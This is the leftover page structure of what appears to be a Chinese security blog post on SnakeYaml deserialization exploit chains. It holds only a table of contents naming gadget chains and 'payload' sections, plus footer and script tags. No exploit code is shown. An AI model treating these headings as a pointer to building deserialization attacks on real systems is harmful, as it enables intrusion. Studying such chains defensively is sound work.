href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">序列化和反序列化示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">运行示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">1.3.3.</span> <span class="toc-text">调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#public%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">public相关问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-SPI%E6%9C%BA%E5%88%B6"><span class="toc-number">1.4.</span> <span class="toc-text">前置知识-SPI机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-connector-java%E4%B8%AD%E7%9A%84SPI"><span class="toc-number">1.4.2.</span> <span class="toc-text">mysql-connector-java中的SPI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#snakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">snakeYaml反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-ScriptEngineManager-%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E5%88%A9%E7%94%A8-SPI-%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">1.5.1.</span> <span class="toc-text">基于 ScriptEngineManager 利用链（利用 SPI 机制）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payloda"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">payloda</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">1.5.2.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0-JndiRefForwardingDataSource"><span class="toc-number">1.5.3.</span> <span class="toc-text">C3P0 JndiRefForwardingDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0-WrapperConnectionPoolDataSource"><span class="toc-number">1.5.4.</span> <span class="toc-text">C3P0 WrapperConnectionPoolDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-PropertyPathFactoryBean"><span class="toc-number">1.5.5.</span> <span class="toc-text">Spring PropertyPathFactoryBean</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.5.5.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">1.5.5.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-XBean"><span class="toc-number">1.5.6.</span> <span class="toc-text">Apache XBean</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96-1"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-1"><span class="toc-number">1.5.6.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Commons-Configuration"><span class="toc-number">1.5.7.</span> <span class="toc-text">Apache Commons Configuration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96-2"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-2"><span class="toc-number">1.5.7.3.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&text=SnakeYaml 链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&title=SnakeYaml 链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&is_video=false&description=SnakeYaml 链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SnakeYaml 链&body=Check out this article: http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&title=SnakeYaml 链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&title=SnakeYaml 链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&title=SnakeYaml 链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&title=SnakeYaml 链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&name=SnakeYaml 链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&t=SnakeYaml 链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2016-2025
        John Doe
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        --><!--
          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
